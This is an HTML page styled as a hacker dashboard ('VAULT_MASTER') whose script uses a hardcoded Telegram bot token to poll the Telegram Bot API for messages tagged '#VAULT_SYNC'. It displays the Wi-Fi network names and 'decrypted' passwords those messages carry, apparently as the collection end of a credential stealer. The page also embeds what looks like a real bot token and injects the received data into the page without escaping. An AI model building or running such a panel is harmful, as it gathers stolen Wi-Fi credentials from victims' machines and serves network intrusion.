<!DOCTYPE html><html><head><meta charset='UTF-8'><title>VAULT_MASTER</title>
<style>
    body { background: #000; color: #00ff41; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
    #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
    .main-view { flex: 1; padding: 30px; overflow-y: auto; position: relative; z-index: 1; }
    h1 { font-size: 20px; letter-spacing: 5px; color: #fff; border-bottom: 2px solid #00ff41; display: inline-block; margin-bottom: 20px;}
    .computer-title { color: #fff; font-size: 16px; margin: 10px 0 5px 0; }
    .meta { font-size: 11px; color: #008f11; margin-bottom: 15px; }
    .wifi-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; background: rgba(0,0,0,0.8); }
    .wifi-table th { text-align: left; font-size: 10px; color: #008f11; padding: 8px; border-bottom: 1px solid #00ff41; }
    .wifi-table td { padding: 8px; font-size: 12px; border-bottom: 1px solid rgba(0, 255, 65, 0.1); }
    .key-text { color: #fff; text-shadow: 0 0 5px #00ff41; font-weight: bold; }
    #debug-log { position: fixed; bottom: 0; right: 0; background: rgba(0,0,0,0.9); color: yellow; font-size: 10px; padding: 5px; border-top: 1px solid #333; width: 100%; z-index: 100; cursor: pointer; }
</style></head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-view">
        <h1>NETWORK_VAULT_CENTRAL</h1>
        <div id="vault-content">
            <p style="color:#008f11;">SYSTEM_READY: SCANNING CLOUD NODES...</p>
        </div>
    </div>
    <div id="debug-log" onclick="refresh()">DEBUG: Initializing... (Tap to Force Refresh)</div>

    <script>
        const botToken = "8748792185:AAGwPcaQwzh-r5oo9-tjvoPQVuo8q_45v-Y";
        const log = (txt) => document.getElementById('debug-log').innerText = "DEBUG: " + txt;

        async function refresh() {
            try {
                log("Requesting Packets...");
                // Scanning a wider range with a higher limit
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100&offset=-100`);
                const json = await res.json();
                
                if (!json.ok) { 
                    log("Telegram API Error: " + json.description); 
                    return; 
                }
                
                const container = document.getElementById('vault-content');
                const results = json.result || [];
                
                log(`Buffer: ${results.length} msgs. Searching for #VAULT_SYNC...`);

                // Filter for our tag in both private messages and channel posts
                const syncMsgs = results.filter(m => {
                    const content = m.message || m.channel_post || m.edited_message;
                    return content && content.text && content.text.includes("#VAULT_SYNC");
                });

                if (syncMsgs.length > 0) {
                    // Get the absolute latest sync message found
                    const latest = syncMsgs[syncMsgs.length - 1];
                    const msgContent = latest.message || latest.channel_post || latest.edited_message;
                    const fullText = msgContent.text;
                    
                    // Extract JSON (everything after the first newline)
                    const jsonStart = fullText.indexOf('[');
                    const jsonEnd = fullText.lastIndexOf(']') + 1;
                    
                    if (jsonStart === -1) {
                        log("Error: Tag found but JSON data missing.");
                        return;
                    }

                    const jsonPart = fullText.substring(jsonStart, jsonEnd);
                    const data = JSON.parse(jsonPart);
                    
                    let html = `
                        <div class="session-block">
                            <h2 class="computer-title">NODE: ${data[0].node || 'UNKNOWN_NODE'}</h2>
                            <div class="meta">LINK: SECURE | LAST_PUSH: ${new Date().toLocaleTimeString()}</div>
                            <table class="wifi-table">
                                <thead><tr><th>SSID</th><th>DECRYPTED_KEY</th></tr></thead>
                                <tbody>`;
                    
                    data.forEach(item => {
                        html += `<tr>
                            <td>${item.ssid}</td>
                            <td class='key-text'>${item.pass}</td>
                        </tr>`;
                    });

                    html += `</tbody></table></div>`;
                    container.innerHTML = html;
                    log("VAULT_SYNCHRONIZED_SUCCESSFULLY");
                } else {
                    log("Wait... No #VAULT_SYNC tag found in buffer.");
                }
            } catch(e) { 
                log("Engine Error: " + e.message);
                console.error(e); 
            }
        }

        // Matrix Animation
        const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const s = "01"; const f = 16; const cols = c.width / f; const drops = Array(Math.floor(cols)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#0F0"; ctx.font = f + "px monospace";
            drops.forEach((y, i) => {
                const txt = s[Math.floor(Math.random() * s.length)];
                ctx.fillText(txt, i * f, y * f);
                if (y * f > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 40);
        setInterval(refresh, 7000); // Auto-refresh every 7 seconds
        refresh();
    </script>
</body></html>
